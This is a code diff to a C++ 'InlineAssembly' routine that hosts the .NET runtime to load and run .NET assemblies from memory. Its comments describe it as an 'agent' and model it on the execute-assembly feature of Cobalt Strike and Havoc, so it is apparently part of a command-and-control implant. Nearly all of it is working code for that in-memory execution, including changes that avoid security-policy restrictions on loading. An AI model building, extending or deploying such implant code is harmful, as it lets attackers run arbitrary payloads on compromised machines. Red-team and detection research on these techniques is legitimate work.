@@ -139,8 +139,12 @@ std::string InlineAssembly(std::vector<std::string> arguments, const std::string
     CLR_STEP(IRuntimeHost->Start(), "IRuntimeHost::Start")
 
     // ── AppDomain ────────────────────────────────────────────────────────────
-    CLR_STEP(IRuntimeHost->CreateDomain(L"InlineAssembly", nullptr, &IAppDomainThunk),
-             "CreateDomain")
+    // Use the default domain. CreateDomain without IAppDomainSetup inherits
+    // restrictive security policies that silently block AppDomain::Load_3.
+    // All working execute-assembly implementations (CS, Havoc, etc.) use the
+    // default domain for exactly this reason.
+    CLR_STEP(IRuntimeHost->GetDefaultDomain(&IAppDomainThunk),
+             "GetDefaultDomain")
 
     CLR_STEP(IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain)),
              "QueryInterface(_AppDomain)")
@@ -157,20 +161,63 @@ std::string InlineAssembly(std::vector<std::string> arguments, const std::string
         SafeArrayUnaccessData(SafeAssembly);
     }
 
-    // Load_3 returns 0x8007000B (ERROR_BAD_FORMAT / BadImageFormatException) when
-    // the assembly targets .NET Core / .NET 5+ instead of .NET Framework 4.x.
-    // The agent uses the .NET Framework CLR (v4.0.30319) and cannot load assemblies
-    // compiled for a different runtime. Compile the target assembly with:
-    //   <TargetFramework>net48</TargetFramework>   (in .csproj)
-    // or via csc:  csc /target:exe Hello.cs  (defaults to .NET Framework on Windows)
-    if (FAILED(HResult = AppDomain->Load_3(SafeAssembly, &Assembly))) {
-        if (HResult == HRESULT_FROM_WIN32(ERROR_BAD_FORMAT)) {
-            return "Error: AppDomain::Load_3 failed (0x8007000B) — "
-                   "assembly must target .NET Framework 4.x, not .NET Core / .NET 5+. "
-                   "Set <TargetFramework>net48</TargetFramework> in the .csproj and recompile.";
+    // Load the assembly via IDispatch::Invoke instead of the TLH vtable.
+    // auto_rename can silently shift vtable offsets in the generated mscorlib.tlh
+    // if it omits or renames any method that precedes Load_3.  Calling by name
+    // through IDispatch is immune to vtable misalignment and is what most
+    // working execute-assembly implementations (CS, Havoc) use under the hood.
+    {
+        IDispatch* pDomainDisp = nullptr;
+        failedStep = "QueryInterface(IDispatch for AppDomain)";
+        if (FAILED(HResult = IAppDomainThunk->QueryInterface(IID_IDispatch,
+                reinterpret_cast<PVOID*>(&pDomainDisp))))
+            goto _CLEANUP;
+
+        OLECHAR* loadName = L"Load";
+        DISPID    loadId   = 0;
+        HResult = pDomainDisp->GetIDsOfNames(IID_NULL, &loadName, 1,
+                                             LOCALE_USER_DEFAULT, &loadId);
+        if (FAILED(HResult)) {
+            pDomainDisp->Release();
+            failedStep = "GetIDsOfNames(Load)";
+            goto _CLEANUP;
         }
-        failedStep = "AppDomain::Load_3";
-        goto _CLEANUP;
+
+        VARIANT varArg;
+        VariantInit(&varArg);
+        varArg.vt     = VT_ARRAY | VT_UI1;
+        varArg.parray = SafeAssembly;
+
+        DISPPARAMS dp   = {};
+        dp.rgvarg       = &varArg;
+        dp.cArgs        = 1;
+
+        VARIANT    varRes  = {};
+        EXCEPINFO  excep   = {};
+        UINT       argErr  = 0;
+        HResult = pDomainDisp->Invoke(loadId, IID_NULL, LOCALE_USER_DEFAULT,
+                                      DISPATCH_METHOD, &dp, &varRes, &excep, &argErr);
+        pDomainDisp->Release();
+
+        if (FAILED(HResult)) {
+            if (HResult == HRESULT_FROM_WIN32(ERROR_BAD_FORMAT)) {
+                return "Error: Assembly.Load failed (0x8007000B) — "
+                       "assembly must target .NET Framework 4.x, not .NET Core / .NET 5+. "
+                       "Set <TargetFramework>net48</TargetFramework> in the .csproj and recompile.";
+            }
+            failedStep = "IDispatch::Invoke(Load)";
+            goto _CLEANUP;
+        }
+
+        // Extract _Assembly from the result VARIANT (VT_DISPATCH or VT_UNKNOWN)
+        IUnknown* pUnk = nullptr;
+        if      (varRes.vt == VT_DISPATCH && varRes.pdispVal) pUnk = varRes.pdispVal;
+        else if (varRes.vt == VT_UNKNOWN  && varRes.punkVal)  pUnk = varRes.punkVal;
+
+        if (!pUnk) { HResult = E_NOINTERFACE; failedStep = "Load result empty"; goto _CLEANUP; }
+
+        HResult = pUnk->QueryInterface(IID_PPV_ARGS(&Assembly));
+        if (FAILED(HResult)) { pUnk->Release(); failedStep = "QueryInterface(_Assembly)"; goto _CLEANUP; }
     }
 
     // ── Entry point ──────────────────────────────────────────────────────────
